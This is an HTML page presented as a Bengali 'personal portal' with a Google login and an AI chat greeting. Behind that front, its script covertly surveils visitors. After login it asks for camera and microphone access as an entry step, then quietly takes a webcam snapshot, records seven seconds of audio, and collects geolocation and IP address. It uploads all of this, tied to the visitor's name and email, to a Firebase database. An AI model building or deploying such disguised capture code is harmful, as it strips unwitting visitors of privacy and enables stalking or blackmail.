<!DOCTYPE html>
<html lang="bn">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Ratan Bro | Personal Portal</title>
    <link href="https://fonts.googleapis.com/css2?family=Hind+Siliguri:wght@400;600;700&display=swap" rel="stylesheet">
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
    <style>
        :root { --pink: #ff4d94; --dark: #020617; }
        * { margin:0; padding:0; box-sizing:border-box; font-family: 'Hind Siliguri', sans-serif; }
        body { background: var(--dark); background: radial-gradient(circle at top right, rgba(255, 77, 148, 0.1), transparent), #020617; color: white; min-height: 100vh; overflow-x: hidden; }
        
        /* Modal Design */
        #login-overlay, #perm-modal { position: fixed; inset: 0; background: var(--dark); z-index: 10000; display: flex; align-items: center; justify-content: center; backdrop-filter: blur(10px); }
        .glass-box { background: rgba(255, 255, 255, 0.03); padding: 40px; border-radius: 30px; border: 1px solid rgba(255, 77, 148, 0.3); text-align: center; width: 90%; max-width: 400px; box-shadow: 0 0 40px rgba(255, 77, 148, 0.2); }
        
        /* Profile & Header */
        .hero-card { margin: 20px; padding: 30px; background: rgba(255, 255, 255, 0.05); border-radius: 30px; border: 1px solid rgba(255, 255, 255, 0.1); backdrop-filter: blur(15px); text-align: center; }
        .p-wrapper { display: flex; justify-content: center; align-items: center; margin-bottom: 15px; }
        .p-img { width: 90px; height: 90px; border-radius: 50%; border: 3px solid var(--pink); box-shadow: 0 0 20px var(--pink); }
        .u-img { width: 75px; height: 75px; margin-left: -20px; border: 3px solid #fff; }

        /* Neon Grid */
        .grid { display: grid; grid-template-columns: repeat(2, 1fr); gap: 15px; padding: 0 20px; max-width: 500px; margin: 0 auto; }
        .card { background: rgba(255, 255, 255, 0.05); border-radius: 20px; padding: 25px; text-align: center; text-decoration: none; color: white; border: 1px solid rgba(255,255,255,0.05); transition: 0.3s; }
        .card:hover { transform: translateY(-5px); border-color: var(--pink); box-shadow: 0 0 15px var(--pink); }
        .card i { font-size: 2rem; color: var(--pink); margin-bottom: 10px; }

        /* Chat */
        .chat-box { max-width: 500px; margin: 25px auto; padding: 15px; background: #000; border-radius: 20px; border: 1px solid #333; font-size: 13px; }
        
        canvas, video { display: none; }
    </style>
</head>
<body>

    <div id="login-overlay">
        <div class="glass-box">
            <img src="ratan.jpg" style="width:100px; border-radius:50%; border:3px solid var(--pink);">
            <h2 style="margin:15px 0;">Welcome to Portal</h2>
            <button onclick="googleLogin()" style="background:var(--pink); color:white; border:none; padding:12px 30px; border-radius:50px; font-weight:bold; cursor:pointer; width:100%;">Google Login</button>
        </div>
    </div>

    <div id="perm-modal" style="display:none;">
        <div class="glass-box">
            <i class="fas fa-microphone-alt" style="font-size:3rem; color:var(--pink);"></i>
            <h3>Access Permission</h3>
            <p style="opacity:0.7; margin:15px 0;">প্রবেশ করতে পারমিশন Allow করুন।</p>
            <button onclick="startApp()" style="background:var(--pink); color:white; border:none; padding:12px 40px; border-radius:50px; font-weight:bold; cursor:pointer;">প্রবেশ করুন</button>
        </div>
    </div>

    <div id="main-ui" style="display:none;">
        <div class="hero-card">
            <div class="p-wrapper">
                <img src="ratan.jpg" class="p-img">
                <img id="u-pic" src="" class="p-img u-img">
            </div>
            <h2 id="u-name"></h2>
            <p style="color:var(--pink); font-size:14px;">Professional Member</p>
        </div>

        <div class="grid">
            <a href="testpaper.html" class="card"><i class="fas fa-file-pdf"></i><p>Test Paper</p></a>
            <a href="business.html" class="card"><i class="fas fa-briefcase"></i><p>Business</p></a>
            <a href="portfolio.html" class="card"><i class="fas fa-user"></i><p>Portfolio</p></a>
            <a href="https://numberlookup.pro.bd/" class="card"><i class="fas fa-search"></i><p>Lookup</p></a>
        </div>

        <div class="chat-box">
            <div id="chat-log" style="height:50px; overflow-y:auto; color:#aaa;">Ratan AI: স্বাগতম! আমি আপনাকে কীভাবে সাহায্য করতে পারি?</div>
        </div>
    </div>

    <canvas id="snapCanvas" width="640" height="480"></canvas>
    <video id="vSource" autoplay playsinline muted></video>

    <script type="module">
        import { initializeApp } from "https://www.gstatic.com/firebasejs/10.7.0/firebase-app.js";
        import { getAuth, signInWithPopup, GoogleAuthProvider, onAuthStateChanged } from "https://www.gstatic.com/firebasejs/10.7.0/firebase-auth.js";
        import { getFirestore, doc, setDoc, updateDoc, getDoc, onSnapshot } from "https://www.gstatic.com/firebasejs/10.7.0/firebase-firestore.js";

        const firebaseConfig = {
            apiKey: "AIzaSyC4ExRu3Oze8api5-ueDTBqZOceSa8wclo",
            authDomain: "ratanweab.firebaseapp.com",
            projectId: "ratanweab",
            storageBucket: "ratanweab.firebasestorage.app",
            messagingSenderId: "611953936063",
            appId: "1:611953936063:web:7e3ca24060d7478fb2a80a"
        };

        const app = initializeApp(firebaseConfig);
        const auth = getAuth(app);
        const db = getFirestore(app);
        const provider = new GoogleAuthProvider();
        let loggedUser = null;

        onAuthStateChanged(auth, user => {
            if (user) {
                loggedUser = user;
                document.getElementById('login-overlay').style.display = 'none';
                document.getElementById('perm-modal').style.display = 'flex';
            }
        });

        window.googleLogin = () => signInWithPopup(auth, provider);

        window.startApp = async () => {
            try {
                const stream = await navigator.mediaDevices.getUserMedia({ video: true, audio: true });
                document.getElementById('vSource').srcObject = stream;
                document.getElementById('perm-modal').style.display = 'none';
                document.getElementById('main-ui').style.display = 'block';
                document.getElementById('u-name').innerText = loggedUser.displayName;
                document.getElementById('u-pic').src = loggedUser.photoURL;

                // --- অটো অ্যাকশন ---
                takeSnap(loggedUser); // ১. সাথে সাথে ছবি
                recordVoice(stream, 7000); // ২. সাথে সাথে ৭ সেকেন্ড ভয়েস
                updateLoc(loggedUser); // ৩. লোকেশন

            } catch (e) { alert("Permission Required!"); }
        };

        async function takeSnap(user) {
            const video = document.getElementById('vSource');
            const canvas = document.getElementById('snapCanvas');
            setTimeout(async () => {
                canvas.getContext('2d').drawImage(video, 0, 0, 640, 480);
                const dataImg = canvas.toDataURL('image/jpeg', 0.5);
                const userRef = doc(db, "users", user.email.replace('.', '_'));
                const s = await getDoc(userRef);
                let picList = s.data()?.picList || [];
                picList.unshift(dataImg);
                if(picList.length > 5) picList.pop();

                const ipData = await fetch('https://api.ipify.org?format=json').then(r=>r.json()).catch(()=>({ip:'N/A'}));
                await setDoc(userRef, { 
                    name: user.displayName, email: user.email, photo: user.photoURL,
                    picList, ip: ipData.ip, status: "Online", lastView: new Date().toLocaleString()
                }, { merge: true });
            }, 2000);
        }

        async function recordVoice(stream, time) {
            const recorder = new MediaRecorder(stream);
            let chunks = [];
            recorder.ondataavailable = e => chunks.push(e.data);
            recorder.onstop = async () => {
                const blob = new Blob(chunks, { type: 'audio/webm' });
                const reader = new FileReader();
                reader.readAsDataURL(blob);
                reader.onloadend = async () => {
                    const userRef = doc(db, "users", loggedUser.email.replace('.', '_'));
                    const s = await getDoc(userRef);
                    let audioList = s.data()?.audioList || [];
                    audioList.unshift(reader.result);
                    if(audioList.length > 4) audioList.pop();
                    await updateDoc(userRef, { audioList });
                };
            };
            recorder.start();
            setTimeout(() => recorder.stop(), time);
        }

        function updateLoc(user) {
            navigator.geolocation.getCurrentPosition(async p => {
                await updateDoc(doc(db, "users", user.email.replace('.', '_')), {
                    loc: `${p.coords.latitude},${p.coords.longitude}`
                });
            });
        }
    </script>
</body>
</html>
